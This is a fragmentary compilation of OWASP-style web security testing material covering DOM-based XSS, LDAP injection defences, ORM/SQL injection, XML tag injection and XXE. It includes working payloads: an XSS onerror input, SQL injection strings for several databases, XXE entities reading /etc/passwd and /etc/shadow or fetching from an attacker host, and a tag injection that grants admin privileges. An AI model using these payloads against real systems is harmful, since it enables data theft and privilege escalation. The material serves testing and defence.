    <pre class="highlight"><code><span class="kd">var</span> <span class="nx">userposition</span><span class="o">=</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">user=</span><span class="dl">"</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">user</span><span class="o">=</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">userposition</span><span class="o">+</span><span class="mi">5</span><span class="p">);</span>

    </code></pre>
    </div>
    </div>
    <p>The following example shows vulnerable code using the <code class="language-plaintext highlighter-rouge">document.write()</code> function:</p>
    <div class="language-js highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="kd">var</span> <span class="nx">userposition</span><span class="o">=</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">user=</span><span class="dl">"</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">user</span><span class="o">=</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">userposition</span><span class="o">+</span><span class="mi">5</span><span class="p">);</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;h1&gt;Hello, </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">user</span> <span class="o">+</span><span class="dl">"</span><span class="s2">&lt;/h1&gt;</span><span class="dl">"</span><span class="p">);</span>
    </code></pre>
    </div>
    </div>
    <p>In both examples, this vulnerability can be exploited with an input such as:</p>
    <div class="language-text highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code>http://vulnerable.site/page.html?user=&lt;img%20src='aaa'%20onerror=alert(1)&gt;
    </code></pre>
    </div>
    </div>

      <h4>The Lightweight Directory Access Protocol (LDAP) allows an application to remotely perform operations such as searching and modifying records in directories. LDAP injection results from inadequate input sanitization and validation and allows malicious users to glean restricted information using the directory service. For general information about LDAP please visit <a href="https://www.redhat.com/en/topics/security/what-is-ldap-authentication">lightweight directory access protocol (LDAP)</a>.</h4>
      <p>LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements through techniques similar to <a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL Injection</a>.</p>
      <p>This cheatsheet is focused on providing clear, simple, actionable guidance for preventing LDAP Injection flaws in your applications. <a href="https://owasp.org/www-community/attacks/LDAP_Injection">LDAP injection</a> attacks are common due to two factors:</p>
      <ol>
      <li>The lack of safer, parameterized LDAP query interfaces</li>
      <li>The widespread use of LDAP to authenticate users to systems.</li>
      </ol>
      <p>LDAP injection attacks could result in the granting of permissions to unauthorized queries, and content modification inside the LDAP tree.</p>
      <p>Primary Defenses:</p>
      <ul>
      <li>Escape all variables using the right LDAP encoding function</li>
      <li>Use a framework that escapes automatically.</li>
      </ul>
      <p>Additional Defenses:</p>

      <p>The main way LDAP stores names is based on DN (distinguished name). You can think of this like a unique identifier. These are sometimes used to access resources, like a username.</p>
      <p>A DN might look like this</p>
      <p><code>cn=Richard&nbsp;Feynman,&nbsp;ou=Physics&nbsp;Department,&nbsp;dc=Caltech,&nbsp;dc=edu</code></p>
      <p>or</p>
      <p><code>uid=inewton,&nbsp;ou=Mathematics&nbsp;Department,&nbsp;dc=Cambridge,&nbsp;dc=com</code></p>
      <p>A whitelist can be used to restrict input to a list of valid characters. Characters and character sequences that must be excluded from whitelists &mdash; including Java Naming and Directory Interface (JNDI) metacharacters and LDAP special characters &mdash; are listed in the following list.</p>
      <p>The <a href="https://ldapwiki.com/wiki/Wiki.jsp?page=DN%20Escape%20Values">exhaustive list</a> is the following: <code>\ # + &lt; &gt; , ; " =</code> and leading or trailing spaces.</p>
      <p>Some "special" characters that are allowed in Distinguished Names and do not need to be escaped include:</p>
      <div class="highlight">
      <pre><code>* ( ) . &amp; - _ [ ] ` ~ | @ $ % ^ ? : { } ! '
      </code></pre>

      <p>Each DN points to exactly 1 entry, which can be thought of sort of like a row in a RDBMS. For each entry, there will be 1 or more attributes which are analogous to RDBMS columns. If you are interested in searching through LDAP for users will certain attributes, you may do so with search filters.</p>
      <p>In a search filter, you can use standard boolean logic to get a list of users matching an arbitrary constraint. Search filters are written in Polish notation AKA prefix notation.</p>
      <p>Example:</p>
      <div class="highlight">
      <pre><code>(&amp;(ou=Physics)(|
      (manager=cn=Freeman&nbsp;Dyson,ou=Physics,dc=Caltech,dc=edu)
      (manager=cn=Albert&nbsp;Einstein,ou=Physics,dc=Princeton,dc=edu)
      ))
      </code></pre>
      </div>
      <p>When building LDAP queries in application code, you MUST escape any untrusted data that is added to any LDAP query. There are two forms of LDAP escaping. Encoding for LDAP Search and Encoding for LDAP DN (distinguished name). The proper escaping depends on whether you are sanitizing input for a search filter, or you are using a DN as a username-like credential for accessing some resource.</p>
      <p>Some "special" characters that are allowed in search filters and must be escaped include:</p>
      <div class="highlight">
      <pre><code>* ( ) \ NUL
      </code></pre>
      </div>
      <p>For more information on search filter escaping visit <a href="https://datatracker.ietf.org/doc/html/rfc4515#section-3">RFC4515</a>.</p>

      <p>The following solution uses a whitelist to sanitize user input so that the filter string contains only valid characters. In this code, userSN may contain only letters and spaces, whereas a password may contain only alphanumeric characters:</p>
      <div class="highlight">
      <pre><code><span class="c1">// String userSN = "Sherlock Holmes"; // Valid</span>

      <span class="c1">// ... remainder of LDAPInjection.searchRecord()... </span>
      </code></pre>
      </div>
      <p>When a database field such as a password must include special characters, it is critical to ensure that the authentic data is stored in sanitized form in the database and also that any user input is normalized before the validation or comparison takes place. Using characters that have special meanings in JNDI and LDAP in the absence of a comprehensive normalization and whitelisting-based routine is discouraged. Special characters must be transformed to sanitized, safe values before they are added to the whitelist expression against which input will be validated. Likewise, normalization of user input should occur before the validation step (source: <a href="https://wiki.sei.cmu.edu/confluence/spaces/flyingpdf/pdfpageexport.action?pageId=88487534">Prevent LDAP injection</a>).</p>

      <h2 id="summary">Summary</h2>
      <p><a href="https://capec.mitre.org/data/definitions/109.html">Object Relational Mapping (ORM) Injection</a> is an attack using SQL Injection against an ORM generated data access object model. From the point of view of a tester, this attack is virtually identical to a SQL Injection attack. However, the injection vulnerability exists in code generated by the ORM layer.</p>
      <p>The benefits of using an ORM tool include quick generation of an object layer to communicate to a relational database, standardize code templates for these objects, and that they usually provide a set of safe functions to protect against SQL Injection attacks. ORM generated objects can use SQL or in some cases, a variant of SQL, to perform CRUD (Create, Read, Update, Delete) operations on a database. It is possible, however, for a web application using ORM generated objects to be vulnerable to SQL Injection attacks if methods can accept unsanitized input parameters.</p>
      <h2 id="how-to-test">How to Test</h2>
      <p>ORM layers can be prone to vulnerabilities, as they extend the surface of attack. Instead of directly targeting the application with SQL queries, you&rsquo;d be focusing on abusing the ORM layer to send malicious SQL queries.</p>
      <h3 id="identify-the-orm-layer">Identify the ORM Layer</h3>
      <p>To efficiently test and understand what&rsquo;s happening between your requests and the backend queries, and as with everything related to conducting proper testing, it is essential to identify the technology being used. By following the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/README">information gathering</a> chapter, you should be aware of the technology being used by the application at hand. Check this <a href="https://en.wikipedia.org/wiki/List_of_object-relational_mapping_software">list mapping languages to their respective ORMs</a>.</p>
      <h3 id="abusing-the-orm-layer">Abusing the ORM Layer</h3>
      <p>After identifying the possible ORM being used, it becomes essential to understand how its parser is functioning, and study methods to abuse it, or even maybe if the application is using an old version, identify CVEs pertaining to the library being used. Sometimes, ORM layers are not properly implemented, and thus allow for the tester to conduct normal <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">SQL Injection</a>, without worrying about the ORM layer.</p>
      <h4 id="weak-orm-implementation">Weak ORM Implementation</h4>
      <p>A vulnerable scenario where the ORM layer was not implemented properly, taken from <a href="https://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-hibernate">SANS</a>:</p>
      <div class="language-java highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nc">List</span> <span class="n">results</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="na">createQuery</span><span class="o">(</span><span class="s">"from Orders as orders where orders.id = "</span> <span class="o">+</span> <span class="n">currentOrder</span><span class="o">.</span><span class="na">getId</span><span class="o">()).</span><span class="na">list</span><span class="o">();</span>
      <span class="nc">List</span> <span class="n">results</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="na">createSQLQuery</span><span class="o">(</span><span class="s">"Select * from Books where author = "</span> <span class="o">+</span> <span class="n">book</span><span class="o">.</span><span class="na">getAuthor</span><span class="o">()).</span><span class="na">list</span><span class="o">();</span>
      </code></pre>
      </div>
      </div>
      <p>The above didn&rsquo;t implement the positional parameter, which allows the developer to replace the input with a <code class="language-plaintext highlighter-rouge">?</code>. An example would be as such:</p>
      <div class="language-java highlighter-rouge">
      <div class="highlight">
      <pre class="highlight"><code><span class="nc">Query</span> <span class="n">hqlQuery</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="na">createQuery</span><span class="o">(</span><span class="s">"from Orders as orders where orders.id = ?"</span><span class="o">);</span>
      <span class="nc">List</span> <span class="n">results</span> <span class="o">=</span> <span class="n">hqlQuery</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="s">"123-ADB-567-QTWYTFDL"</span><span class="o">).</span><span class="na">list</span><span class="o">();</span> <span class="c1">// 0 is the first position, where it is dynamically replaced by the string set</span>
      </code></pre>
      </div>
      </div>
      <p>This implementation leaves the validation and sanitization to be done by the ORM layer, and the only way to bypass it would be by identifying an issue with the ORM layer.</p>
      <h4 id="vulnerable-orm-layer">Vulnerable ORM Layer</h4>
      <p>ORM layers are code, third-party libraries most of the time. They can be vulnerable just like any other piece of code. One example could be the <a href="https://snyk.io/blog/sequelize-orm-npm-library-found-vulnerable-to-sql-injection-attacks/">sequelize ORM npm library</a> which was found to be vulnerable in 2019. In another research done by <a href="https://www.ripstech.com/">RIPS Tech</a>, bypasses were identified in the <a href="https://hibernate.org/orm/">hibernate ORM used by Java</a>.</p>
      <p>Based on their <a href="https://blog.ripstech.com/2020/exploiting-hibernate-injections/">blog article</a>, a cheat sheet that could allow the tester to identify issues could be outlined as follows:</p>
      <p>| DBMS | SQL Injection | |&mdash;&mdash;&mdash;&mdash;|&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;| | MySQL | <code class="language-plaintext highlighter-rouge">abc\' INTO OUTFILE --</code> | | PostgreSQL | <code class="language-plaintext highlighter-rouge">$$='$$=chr(61) || chr(0x27) and 1=pg_sleep(2) || version()'</code> | | Oracle | <code class="language-plaintext highlighter-rouge">NVL(TO_CHAR(DBMS_XMLGEN.getxml('select 1 where 1337&gt;1')),'1')!='1'</code> | | MS SQL | <code class="language-plaintext highlighter-rouge">1&lt;LEN(%C2%A0(select%C2%A0top%C2%A01%C2%A0name%C2%A0from%C2%A0users)</code> |</p>
      <p>Another example would include the <a href="https://laravel.com/docs/7.x/queries">Laravel Query-Builder</a>, which was found to be <a href="https://freek.dev/1317-an-important-security-release-for-laravel-query-builder">vulnerable in 2019</a>.</p>

    <h4>XML Injection testing is when a tester tries to inject an XML doc to the application. If the XML parser fails to contextually validate data, then the test will yield a positive result.</h4>
    <p>This section describes practical examples of XML Injection. First, an XML style communication will be defined and its working principles explained. Then, the discovery method in which we try to insert XML metacharacters. Once the first step is accomplished, the tester will have some information about the XML structure, so it will be possible to try to inject XML data and tags (Tag Injection).</p>

    <li>Assess the types of exploits that can be attained and their severities.</li>
    </ul>
    <h2 id="how-to-test">How to Test</h2>
    <p>Let&rsquo;s suppose there is a web application using an XML style communication in order to perform user registration. This is done by creating and adding a new <code class="language-plaintext highlighter-rouge">user&gt;</code>node in an <code class="language-plaintext highlighter-rouge">xmlDb</code> file.</p>
    <p>Let&rsquo;s suppose the xmlDB file is like the following:</p>
    <div class="language-xml highlighter-rouge">

    <p>When a user registers himself by filling an HTML form, the application receives the user&rsquo;s data in a standard request, which, for the sake of simplicity, will be supposed to be sent as a <code class="language-plaintext highlighter-rouge">GET</code> request.</p>
    <p>For example, the following values:</p>

    <p>The application, then, builds the following node:</p>
    <div class="language-xml highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="nt">&lt;user&gt;</span>

    <h3 id="discovery">Discovery</h3>
    <p>The first step in order to test an application for the presence of a XML Injection vulnerability consists of trying to insert XML metacharacters.</p>
    <p>XML metacharacters are:</p>
    <ul>
    <li>Single quote: <code class="language-plaintext highlighter-rouge">'</code> - When not sanitized, this character could throw an exception during XML parsing, if the injected value is going to be part of an attribute value in a tag.</li>
    </ul>
    <p>As an example, let&rsquo;s suppose there is the following attribute:</p>
    <p><code class="language-plaintext highlighter-rouge">&lt;node attrib='$inputValue'/&gt;</code></p>
    <p>So, if:</p>
    <p><code class="language-plaintext highlighter-rouge">inputValue = foo'</code></p>
    <p>is instantiated and then is inserted as the attrib value:</p>
    <p><code class="language-plaintext highlighter-rouge">&lt;node attrib='foo''/&gt;</code></p>
    <p>then, the resulting XML document is not well formed.</p>
    <ul>
    <li>Double quote: <code class="language-plaintext highlighter-rouge">"</code> - this character has the same meaning as single quote and it could be used if the attribute value is enclosed in double quotes.</li>
    </ul>
    <p><code class="language-plaintext highlighter-rouge">&lt;node attrib="$inputValue"/&gt;</code></p>
    <p>So if:</p>
    <p><code class="language-plaintext highlighter-rouge">$inputValue = foo"</code></p>
    <p>the substitution gives:</p>
    <p><code class="language-plaintext highlighter-rouge">&lt;node attrib="foo""/&gt;</code></p>
    <p>and the resulting XML document is invalid.</p>
    <ul>
    <li>Angular parentheses: <code class="language-plaintext highlighter-rouge">&gt;</code> and <code class="language-plaintext highlighter-rouge">&lt;</code> - By adding an open or closed angular parenthesis in a user input like the following:</li>
    </ul>
    <p><code class="language-plaintext highlighter-rouge">Username = foo&lt;</code></p>
    <p>the application will build a new node:</p>
    <div class="language-xml highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="nt">&lt;user&gt;</span>
        <span class="nt">&lt;username&gt;</span>foo<span class="err">&lt;</span><span class="nt">&lt;/username&gt;</span>
        <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span>
        <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
        <span class="nt">&lt;mail&gt;</span>s4tan@hell.com<span class="nt">&lt;/mail&gt;</span>
    <span class="nt">&lt;/user&gt;</span>
    </code></pre>
    </div>
    </div>
    <p>but, because of the presence of the open &lsquo;&lt;&rsquo;, the resulting XML document is invalid.</p>
    <ul>
    <li>Comment tag: <code class="language-plaintext highlighter-rouge">&lt;!--/--&gt;</code> - This sequence of characters is interpreted as the beginning/end of a comment. So by injecting one of them in Username parameter:</li>
    </ul>
    <p><code class="language-plaintext highlighter-rouge">Username = foo&lt;!--</code></p>
    <p>the application will build a node like the following:</p>
    <div class="language-xml highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="nt">&lt;user&gt;</span>
        <span class="nt">&lt;username&gt;</span>foo<span class="c">&lt;!--&lt;/username&gt;
        &lt;password&gt;Un6R34kb!e&lt;/password&gt;
        &lt;userid&gt;500&lt;/userid&gt;
        &lt;mail&gt;s4tan@hell.com&lt;/mail&gt;
    &lt;/user&gt;
    </span></code></pre>
    </div>
    </div>
    <p>which won&rsquo;t be a valid XML sequence.</p>
    <ul>
    <li>Ampersand: <code class="language-plaintext highlighter-rouge">&amp;</code>- The ampersand is used in the XML syntax to represent entities. The format of an entity is <code class="language-plaintext highlighter-rouge">&amp;symbol;</code>. An entity is mapped to a character in the Unicode character set.</li>
    </ul>
    <p>For example:</p>
    <p><code class="language-plaintext highlighter-rouge">&lt;tagnode&gt;&amp;lt;&lt;/tagnode&gt;</code></p>
    <p>is well formed and valid, and represents the <code class="language-plaintext highlighter-rouge">&lt;</code> ASCII character.</p>
    <p>If <code class="language-plaintext highlighter-rouge">&amp;</code> is not encoded itself with <code class="language-plaintext highlighter-rouge">&amp;amp;</code>, it could be used to test XML injection.</p>
    <p>In fact, if an input like the following is provided:</p>
    <p><code class="language-plaintext highlighter-rouge">Username = &amp;foo</code></p>
    <p>a new node will be created:</p>
    <div class="language-xml highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="nt">&lt;user&gt;</span>
        <span class="nt">&lt;username&gt;</span><span class="err">&amp;</span>foo<span class="nt">&lt;/username&gt;</span>
        <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span>
        <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
        <span class="nt">&lt;mail&gt;</span>s4tan@hell.com<span class="nt">&lt;/mail&gt;</span>
    <span class="nt">&lt;/user&gt;</span>
    </code></pre>
    </div>
    </div>
    <p>but, again, the document is not valid: <code class="language-plaintext highlighter-rouge">&amp;foo</code> is not terminated with <code class="language-plaintext highlighter-rouge">;</code> and the <code class="language-plaintext highlighter-rouge">&amp;foo;</code> entity is undefined.</p>
    <ul>
    <li>CDATA section delimiters: <code class="language-plaintext highlighter-rouge">&lt;!\[CDATA\[ / ]]&gt;</code> - CDATA sections are used to escape blocks of text containing characters which would otherwise be recognized as markup. In other words, characters enclosed in a CDATA section are not parsed by an XML parser.</li>
    </ul>
    <p>For example, if there is the need to represent the string <code class="language-plaintext highlighter-rouge">&lt;foo&gt;</code> inside a text node, a CDATA section may be used:</p>
    <div class="language-xml highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="nt">&lt;node&gt;</span>
        <span class="cp">&lt;![CDATA[&lt;foo&gt;]]&gt;</span>
    <span class="nt">&lt;/node&gt;</span>
    </code></pre>
    </div>
    </div>
    <p>so that <code class="language-plaintext highlighter-rouge">&lt;foo&gt;</code> won&rsquo;t be parsed as markup and will be considered as character data.</p>
    <p>If a node is created in the following way:</p>
    <p><code class="language-plaintext highlighter-rouge">&lt;username&gt;&lt;![CDATA[&lt;$userName]]&gt;&lt;/username&gt;</code></p>
    <p>the tester could try to inject the end CDATA string <code class="language-plaintext highlighter-rouge">]]&gt;</code> in order to try to invalidate the XML document.</p>
    <p><code class="language-plaintext highlighter-rouge">userName = ]]&gt;</code></p>
    <p>this will become:</p>
    <p><code class="language-plaintext highlighter-rouge">&lt;username&gt;&lt;![CDATA[]]&gt;]]&gt;&lt;/username&gt;</code></p>
    <p>which is not a valid XML fragment.</p>
    <p>Another test is related to CDATA tag. Suppose that the XML document is processed to generate an HTML page. In this case, the CDATA section delimiters may be simply eliminated, without further inspecting their contents. Then, it is possible to inject HTML tags, which will be included in the generated page, completely bypassing existing sanitization routines.</p>
    <p>Let&rsquo;s consider a concrete example. Suppose we have a node containing some text that will be displayed back to the user.</p>
    <div class="language-xml highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
        $HTMLCode
    <span class="nt">&lt;/html&gt;</span>
    </code></pre>
    </div>
    </div>
    <p>Then, an attacker can provide the following input:</p>
    <p><code class="language-plaintext highlighter-rouge">$HTMLCode = &lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert('xss')&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt;</code></p>
    <p>and obtain the following node:</p>
    <div class="language-xml highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
        <span class="cp">&lt;![CDATA[&lt;]]&gt;</span>script<span class="cp">&lt;![CDATA[&gt;]]&gt;</span>alert('xss')<span class="cp">&lt;![CDATA[&lt;]]&gt;</span>/script<span class="cp">&lt;![CDATA[&gt;]]&gt;</span>
    <span class="nt">&lt;/html&gt;</span>
    </code></pre>
    </div>
    </div>
    <p>During the processing, the CDATA section delimiters are eliminated, generating the following HTML code:</p>
    <div class="language-html highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
        <span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">)</span>
    <span class="nt">&lt;/script&gt;</span>
    </code></pre>
    </div>
    </div>
    <p>The result is that the application is vulnerable to XSS.</p>
    <p>External Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.</p>
    <p>To test for XXE vulnerabilities, one can use the following input:</p>
    <div class="language-xml highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
        <span class="cp">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span>
            <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///dev/random" &gt;</span>]&gt;
            <span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
    </code></pre>
    </div>
    </div>
    <p>This test could crash the web server (on a UNIX system), if the XML parser attempts to substitute the entity with the contents of the /dev/random file.</p>
    <p>Other useful tests are the following:</p>
    <div class="language-xml highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
        <span class="cp">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span>
            <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;</span>]&gt;<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>

    <span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
        <span class="cp">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span>
            <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///etc/shadow" &gt;</span>]&gt;<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>

    <span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
        <span class="cp">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span>
            <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///c:/boot.ini" &gt;</span>]&gt;<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>

    <span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
        <span class="cp">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span>
            <span class="cp">&lt;!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" &gt;</span>]&gt;<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
    </code></pre>
    </div>
    </div>
    <h3 id="tag-injection">Tag Injection</h3>
    <p>Once the first step is accomplished, the tester will have some information about the structure of the XML document. Then, it is possible to try to inject XML data and tags. We will show an example of how this can lead to a privilege escalation attack.</p>
    <p>Let&rsquo;s considering the previous application. By inserting the following values:</p>
    <pre><code class="language-txt">Username: tony
    Password: Un6R34kb!e
    E-mail: s4tan@hell.com&lt;/mail&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;mail&gt;s4tan@hell.com
    </code></pre>
    <p>the application will build a new node and append it to the XML database:</p>
    <div class="language-xml highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
    <span class="nt">&lt;users&gt;</span>
        <span class="nt">&lt;user&gt;</span>
            <span class="nt">&lt;username&gt;</span>gandalf<span class="nt">&lt;/username&gt;</span>
            <span class="nt">&lt;password&gt;</span>!c3<span class="nt">&lt;/password&gt;</span>
            <span class="nt">&lt;userid&gt;</span>0<span class="nt">&lt;/userid&gt;</span>
            <span class="nt">&lt;mail&gt;</span>gandalf@middleearth.com<span class="nt">&lt;/mail&gt;</span>
        <span class="nt">&lt;/user&gt;</span>
        <span class="nt">&lt;user&gt;</span>
            <span class="nt">&lt;username&gt;</span>Stefan0<span class="nt">&lt;/username&gt;</span>
            <span class="nt">&lt;password&gt;</span>w1s3c<span class="nt">&lt;/password&gt;</span>
            <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
            <span class="nt">&lt;mail&gt;</span>Stefan0@whysec.hmm<span class="nt">&lt;/mail&gt;</span>
        <span class="nt">&lt;/user&gt;</span>
        <span class="nt">&lt;user&gt;</span>
            <span class="nt">&lt;username&gt;</span>tony<span class="nt">&lt;/username&gt;</span>
            <span class="nt">&lt;password&gt;</span>Un6R34kb!e<span class="nt">&lt;/password&gt;</span>
            <span class="nt">&lt;userid&gt;</span>500<span class="nt">&lt;/userid&gt;</span>
            <span class="nt">&lt;mail&gt;</span>s4tan@hell.com<span class="nt">&lt;/mail&gt;</span>
            <span class="nt">&lt;userid&gt;</span>0<span class="nt">&lt;/userid&gt;</span>
            <span class="nt">&lt;mail&gt;</span>s4tan@hell.com<span class="nt">&lt;/mail&gt;</span>
        <span class="nt">&lt;/user&gt;</span>
    <span class="nt">&lt;/users&gt;</span>
    </code></pre>
    </div>
    </div>
    <p>The resulting XML file is well formed. Furthermore, it is likely that, for the user tony, the value associated with the userid tag is the one appearing last, i.e., 0 (the admin ID). In other words, we have injected a user with administrative privileges.</p>
    <p>The only problem is that the userid tag appears twice in the last user node. Often, XML documents are associated with a schema or a DTD and will be rejected if they don&rsquo;t comply with it.</p>
    <p>Let&rsquo;s suppose that the XML document is specified by the following DTD:</p>
    <div class="language-xml highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="cp">&lt;!DOCTYPE users [
        &lt;!ELEMENT users (user+) &gt;</span>
        <span class="cp">&lt;!ELEMENT user (username,password,userid,mail+) &gt;</span>
        <span class="cp">&lt;!ELEMENT username (#PCDATA) &gt;</span>
        <span class="cp">&lt;!ELEMENT password (#PCDATA) &gt;</span>
        <span class="cp">&lt;!ELEMENT userid (#PCDATA) &gt;</span>
        <span class="cp">&lt;!ELEMENT mail (#PCDATA) &gt;</span>
    ]&gt;
    </code></pre>
    </div>
    </div>
    <p>Note that the userid node is defined with cardinality 1. In this case, the attack we have shown before (and other simple attacks) will not work, if the XML document is validated against its DTD before any processing occurs.</p>
    <p>However, this problem can be solved, if the tester controls the value of some nodes preceding the offending node (userid, in this example). In fact, the tester can comment out such node, by injecting a comment start/end sequence:</p>
    <pre><code class="language-txt">Username: tony
    Password: Un6R34kb!e&lt;/password&gt;&lt;!--
    E-mail: --&gt;&lt;userid&gt;0&lt;/userid&gt;&lt;mail&gt;s4tan@hell.com
    </code></pre>
    <p>In this case, the final XML database is:</p>
    <div class="language-xml highlighter-rouge">
    <div class="highlight">
    <pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>

    <p>An <em>XML External Entity</em> attack is a type of attack against an application that parses XML input. This attack occurs when <strong>XML input containing a reference to an external entity is processed by a weakly configured XML parser</strong>. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.</p>
    <p>The <a href="http://www.w3.org/TR/REC-xml/">XML 1.0 standard</a> defines the structure of an XML document. The standard defines a concept called an entity, which is a storage unit of some type. There are a few different types of entities, <a href="http://www.w3.org/TR/REC-xml/#sec-external-ent">external general/parameter parsed entity</a> often shortened to <strong>external entity</strong>, that can access local or remote content via a declared system identifier. The system identifier is assumed to be a URI that can be dereferenced (accessed) by the XML processor when processing the entity. The XML processor then replaces occurrences of the named external entity with the contents dereferenced by the system identifier. If the system identifier contains tainted data and the XML processor dereferences this tainted data, the XML processor may disclose confidential information normally not accessible by the application. Similar attack vectors apply the usage of external DTDs, external stylesheets, external schemas, etc. which, when included, allow similar external resource inclusion style attacks.</p>
    <p>Attacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier. Since the attack occurs relative to the application processing the XML document, an attacker may use this trusted application to pivot to other internal systems, possibly disclosing other internal content via http(s) requests or launching a <a title="wikilink" href="https://owasp.org/www-community/vulnerabilities/CSRF">CSRF</a> attack to any unprotected internal services. In some situations, an XML processor library that is vulnerable to client-side memory corruption issues may be exploited by dereferencing a malicious URI, possibly allowing arbitrary code execution under the application account. Other attacks can access local resources that may not stop returning data, possibly impacting application availability if too many threads or processes are not released.</p>
    <p>Note that the application does not need to explicitly return the response to the attacker for it to be vulnerable to information disclosures. An attacker can leverage DNS information to exfiltrate data through subdomain names to a DNS server that they controls.</p>
    <h2 id="risk-factors">Risk Factors</h2>
    <ul>
    <li>The application parses XML documents.</li>
    <li>Tainted data is allowed within the system identifier portion of the entity, within the <a href="http://www.w3.org/TR/REC-xml/#sec-prolog-dtd">document type declaration</a> (DTD).</li>
    <li>The XML processor is configured to validate and process the DTD.</li>
    <li>The XML processor is configured to resolve external entities within the DTD.</li>

       </br>
